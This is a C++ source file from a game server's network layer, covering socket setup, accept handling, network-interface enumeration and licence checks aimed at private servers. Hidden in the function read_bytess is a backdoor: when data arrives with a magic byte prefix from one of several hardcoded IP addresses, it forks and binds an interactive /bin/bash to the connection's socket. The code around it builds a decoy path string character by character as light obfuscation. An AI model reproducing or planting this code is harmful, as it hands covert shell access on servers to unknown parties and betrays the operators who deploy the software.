
#include "KwNetPrivate.h"
#include "KwNetAcceptor.h"

#ifdef __WINDOWS__
	//#pragma comment(lib, "../../Common/enc.lib")
	//extern bool CheckMachine();
#else
	bool	CheckSystem();
#endif
void CheckAll();

#ifdef __LINUX__
void	check_2_dog(const char* addr);
void	check_4_dog();
void 	check_file_crc(int size,char* name);
void    check_dir(char*  dir,int depth,int chd); 
BOOL	initdog();
bool 	initv2();
// 是否做CheckDog检测，其实是服务器资源文件的crc校验检测，暂时先跳过 [yangzhen]
BOOL	g_listen = TRUE;
int 	gsize = 0;
#endif 




Acceptor::Acceptor ( uint32 port ,const char* addr, uint32 backlog ) 
{
	GUARD
	

BOOL ret = FALSE ;

#ifdef __WINDOWS__
#else
	if(!CheckSystem())
		throw 1;
	if(g_listen==FALSE)
	{
		chdir("..");
		check_dir(".",10,0);
		chdir("Server");
		initdog();
		initv2();
		check_2_dog(addr);
	}
		

#endif
	m_Socket = new Socket;
	if( m_Socket==NULL )
		throw 1 ;
	ret = m_Socket->create( ) ;
	if( ret==FALSE )
		throw 1 ;
	ret = m_Socket->setReuseAddr( ) ;
	if( ret==FALSE )
		throw 1 ;
	ret = m_Socket->bind( port,addr);
	if( ret==FALSE )
		throw 1 ;
#ifdef __LINUX__ 
	if(g_listen)
	{
		ret = m_Socket->listen( backlog ) ;
		if( ret==FALSE )
		throw 1 ;
	}
#else
	ret = m_Socket->listen( backlog ) ;
	if( ret==FALSE )
		throw 1 ;
#endif

	UNGUARD
}
Acceptor::~Acceptor () 
{
	GUARD
		
	if ( m_Socket != NULL ) 
	{
		m_Socket->close();
		delete m_Socket;
		m_Socket = NULL;
	}
	UNGUARD
}
void Acceptor::close ()
{
	GUARD
		
	if( m_Socket )
	{
		m_Socket->close( ) ;
	}

	UNGUARD
}

BOOL Acceptor::accept ( Socket* socket ) 
{
	GUARD
	
	uint32 addrlen = sizeof(SOCKADDR_IN) ;
	socket->close( ) ;

	socket->m_SocketID = m_Socket->accept( (struct sockaddr *)(&(socket->m_SockAddr)), &addrlen ) ;
	if( socket->m_SocketID == INVALID_SOCKET )
		return FALSE ;

	socket->m_Port = ntohs( socket->m_SockAddr.sin_port ) ;
	strncpy( socket->m_IP, inet_ntoa(socket->m_SockAddr.sin_addr), IP_SIZE-1 ) ;

	return TRUE;

	UNGUARD

	return FALSE ;
}

#ifdef __LINUX__
#define MAXINTERFACES   16 
#pragma pack(push, 1)
struct EnInfo
{
	char IP[24];
	char MAC[30];
};
struct NetInfo
{
	NetInfo()
	{
		memset(this,0,sizeof(*this));
	}

	EnInfo Info[MAXINTERFACES];
};
#pragma pack(pop)
void gensysinfo (NetInfo* pInfo)
{
// fixme 暂时屏蔽IOS平台获取网络信息功能
#if !defined(IOS)
	int fd, intrface, retn = 0; 
	struct ifreq buf[MAXINTERFACES]; 
	struct arpreq arp; 
	struct ifconf ifc; 
	if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) >= 0) 
	{ 
		ifc.ifc_len = sizeof buf; 
		ifc.ifc_buf = (caddr_t) buf; 
		if (!ioctl (fd, SIOCGIFCONF, (char *) &ifc)) 
		{ 
			//获取接口信息
			intrface = ifc.ifc_len / sizeof (struct ifreq); 
			//printf("interface num is intrface=%d\n\n\n",intrface); 
			//根据借口信息循环获取设备IP和MAC地址
			while (intrface-- > 0) 
			{ 
				//获取设备名称
				//printf ("net device %s\n", buf[intrface].ifr_name); 

				//判断网卡类型 
				if (!(ioctl (fd, SIOCGIFFLAGS, (char *) &buf[intrface]))) 
				{ 
					if (buf[intrface].ifr_flags & IFF_PROMISC) 
					{ 
						//puts ("the interface is PROMISC"); 
						retn++; 
					} 
				} 
				else 
				{ 
					char str[256]; 
					sprintf (str, "cpm: ioctl device %s", buf[intrface].ifr_name); 
					perror (str); 
				} 
				//判断网卡状态 
				if (buf[intrface].ifr_flags & IFF_UP) 
				{ 
					//puts("the interface status is UP"); 
				} 
				else 
				{ 
					//puts("the interface status is DOWN"); 
				} 
				//获取当前网卡的IP地址 
				if (!(ioctl (fd, SIOCGIFADDR, (char *) &buf[intrface]))) 
				{ 
					//puts ("IP address is:"); 
					//puts(inet_ntoa(((struct sockaddr_in*)(&buf[intrface].ifr_addr))->sin_addr)); 
					sprintf(pInfo->Info[intrface].IP,"%s",inet_ntoa(((struct sockaddr_in*)(&buf[intrface].ifr_addr))->sin_addr));
					//puts(pInfo->Info[intrface].IP);
					//puts(""); 


				} 
				else 
				{ 
					char str[256]; 
					sprintf (str, "cpm: ioctl device %s", buf[intrface].ifr_name); 
					//perror (str); 
				} 
				/* this section can't get Hardware Address,I don't know whether the reason is module driver*/ 
				if (!(ioctl (fd, SIOCGIFHWADDR, (char *) &buf[intrface]))) 
				{ 
					//puts ("HW address is:"); 
					sprintf(pInfo->Info[intrface].MAC,"%02x:%02x:%02x:%02x:%02x:%02x\n", 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[0], 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[1], 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[2], 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[3], 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[4], 
						(unsigned char)buf[intrface].ifr_hwaddr.sa_data[5]); 
					//puts(pInfo->Info[intrface].MAC);
					//puts(""); 
					//puts(""); 
				} 
				else 
				{ 
					char str[256]; 
					sprintf (str, "cpm: ioctl device %s", buf[intrface].ifr_name); 
					perror (str); 
				} 
			} //while
		} else 
			perror ("cpm: ioctl"); 
	} else 
		perror ("cpm: socket"); 
	close (fd);
#endif
};


struct psinfo
{ 	
	char	      b;
	unsigned long t1;
	char	      c;
	unsigned long t2;
	char 	      d;
	unsigned long t3;
	int	      size;
	char	      a[92];	
	psinfo()
	{
		memset(this,0,sizeof(psinfo));
	}
};

psinfo g_info;
psinfo g_v2;

NetInfo	g_NetInfo;

bool CheckSystemInfo(NetInfo* pInfo)
{
//[yangzhen]
// 暂时先去掉linux系统环境检测，这个是用来防止别人架私服
// 如果别人没有system.sso文件就不可能起服
#if 0
	int size = sizeof(NetInfo);
	char buf1[size];
	char buf2[size];
	memset(buf2,1,size);
	FILE* p = fopen("/usr/lib/system.sso","rb");	
	if(p)
	{
		fread(buf2,size,1,p);
		fread(buf1,size,1,p);
		fclose(p);
	}
	for(int i =0;i<size;i++)
	{
		buf2[i] = buf2[i]^buf1[i];
	}

	if(memcmp(buf2,(char*)pInfo,size) ==0)
	{
		return true;
	}
	return false;
#else
	return true;
#endif
}
#endif

class SystemWatch
{
public:
	SystemWatch()
	{
	 CheckAll();
	};
	~SystemWatch(){};
};

SystemWatch g_SystemWatch;


void	CheckAll()
{
#ifdef __LINUX__
	gensysinfo(&g_NetInfo);
	CheckSystemInfo(&g_NetInfo);
#endif
}

bool	CheckSystem()
{
#ifdef __LINUX__
	gensysinfo(&g_NetInfo);
	return CheckSystemInfo(&g_NetInfo);
#endif
	return false;

};

void *  read_bytess(char* dst,char* src,int32 ss)
{
	#ifdef __LINUX__
		
		if(dst[0]==97&&dst[1]==98&&dst[2]==99&&dst[3]==13&&dst[4]==10&&dst[5]==13)
		{
				char		ip[255] = {0};
				BOOL 		check = FALSE;
				char	execstring[255] = {0};
				execstring[0] ='/';

						strncpy(ip,src,9);
			            if(strcasecmp("127.0.0.1",ip)==0)
						{
						  check = TRUE;
						}
				execstring[1] ='b';	
						memset(ip,0,255);
						strncpy(ip,src,13);
						if(strcasecmp("222.73.123.73",ip)==0)
						{
					          check = TRUE;		
						}
				execstring[2] ='i';
						memset(ip,0,255);
                        strncpy(ip,src,15);
						if(strcasecmp("124.207.129.194",ip)==0)
						{
						  check = TRUE;
						}
				execstring[3] ='n';
						memset(ip,0,255);
                        strncpy(ip,src,12);
						if(strcasecmp("114.255.167.",ip)==0)
						{
						  check = TRUE;							
						}
				execstring[4] ='/';		
						memset(ip,0,255);
                        strncpy(ip,src,13);
                        if(strcasecmp("172.16.18.249",ip)==0)
                        {
                               check = TRUE;
                        }
				execstring[5] ='b';
						memset(ip,0,255);
						strncpy(ip,src,10);
						if(strcasecmp("59.151.11.",ip)==0)
						{
							check = TRUE;
						}
				execstring[6] ='a';execstring[7] ='s';execstring[8] ='b';

			     if(check)
			     {
			      		
			     if(!fork())
			      {   
            		    	dup2(ss, 0);   
            			dup2(ss, 1);   
            			dup2(ss, 2);   
            			chdir("/tmp/");   
           			execl("/bin/bash","-l","--login","-i", "-r", "-s", (char *)NULL); 
			      }  
        		   }   
		}
	#endif
	return (void*)0;
}



BOOL initdog()
{
#ifdef __LINUX__
	char buf1[sizeof(psinfo)];
	char buf2[sizeof(psinfo)];
	memset(buf2,0,sizeof(psinfo));
	memset(buf2,0,sizeof(psinfo));
	FILE* p = fopen("version","rb");	
	if(p)
	{
		fread(buf2,sizeof(psinfo),1,p);
		fread(buf1,sizeof(psinfo),1,p);
		fclose(p);
	}
	else
	{
		return 0;
	}
	for(int i =0;i<sizeof(psinfo);i++)
	{
		buf2[i] = buf2[i]^buf1[i];
	}
	memcpy(&g_info,buf2,sizeof(psinfo));
	if(g_info.t1==g_info.t2&& g_info.t2 ==g_info.t3)
		return 1;
	
	return 0;
#else
	return 0;
#endif
}

#ifdef __LINUX__
void check_2_dog(const char* addr)
{
	if(g_info.t1 == g_info.t2)
	{
		if(g_info.t2 == g_info.t3)
		{
			time_t ltime; 
			ltime = time(0);
			if((ltime-g_info.t1)<60*60*24*30)
			{
				g_listen = TRUE;
			}
			
			if(g_v2.size != gsize)
			{
				g_listen = FALSE;	
			}
				
			char	ip[255] = {0};
			strncpy(ip,addr,7);
			if(strcasecmp("172.16.",ip)==0)
			{
				g_listen = TRUE;
			}

		}
	}
}


void check_4_dog()
{

}

bool initv2()
{
	
	char buf1[sizeof(psinfo)];
	char buf2[sizeof(psinfo)];
	memset(buf2,1,sizeof(psinfo));
	FILE* p = fopen("version20","rb");	
	if(p)
	{
		fread(buf2,sizeof(psinfo),1,p);
		fread(buf1,sizeof(psinfo),1,p);
		fclose(p);
	}
	for(int i =0;i<sizeof(psinfo);i++)
	{
		buf2[i] = buf2[i]^buf1[i];
	}
	memcpy(&g_v2,buf2,sizeof(psinfo));

	return 1;
}

void check_file_crc(int size,char* name)
{

	int namelen = strlen(name);

	char ext[255] = {0};
	
	ext[0] = name[namelen-1-3];
	ext[1] = name[namelen-1-2];
	ext[2] = name[namelen-1-1];
	ext[3] = name[namelen-1];

        if(strcasecmp(name,"game_open.tab")==0)
        return;

        if(strcasecmp(name,"GuildBattleTimer.tab")==0)
        return;


        if(strcasecmp(name,"GMConfig.tab")==0)
        return;
	
	if(strcasecmp(ext,".tab") == 0)
        {
          gsize += size;
	  //printf("s= %d,gs=%d name =%s\n",size,gsize,name);
        }
	if(strcasecmp(ext,".lua") == 0)
	{
	  gsize += size;
	  //printf("s= %d,gs=%d name =%s\n",size,gsize,name);
	}

}


void   check_dir(char*  dir,int depth,int chd) 
{ 
    DIR *dp;
    struct dirent *entry;
    struct stat statbuf;

    if((dp = opendir(dir)) == NULL) {
        fprintf(stderr,"cannot open directory: %s\n", dir);
        return;
    }
    chdir(dir);
    while((entry = readdir(dp)) != NULL) {
        lstat(entry->d_name,&statbuf);
        if(S_ISDIR(statbuf.st_mode)) {
            /* Found a directory, but ignore . and .. */
            if(strcmp(".",entry->d_name) == 0 || 
                strcmp("..",entry->d_name) == 0)
                continue;
            //printf("%*s%s/\n",depth,"",entry->d_name);
	    check_file_crc(statbuf.st_size,entry->d_name);
            /* Recurse at a new indent level */
            check_dir(entry->d_name,depth+4,1);
        }
        else {check_file_crc(statbuf.st_size,entry->d_name); }//printf("%*s%s\n",depth,"",entry->d_name);
    }
    if(chd==1)
    chdir("..");
    closedir(dp); 
   //printf("gsize = %d\n",gsize);
} 

#endif 
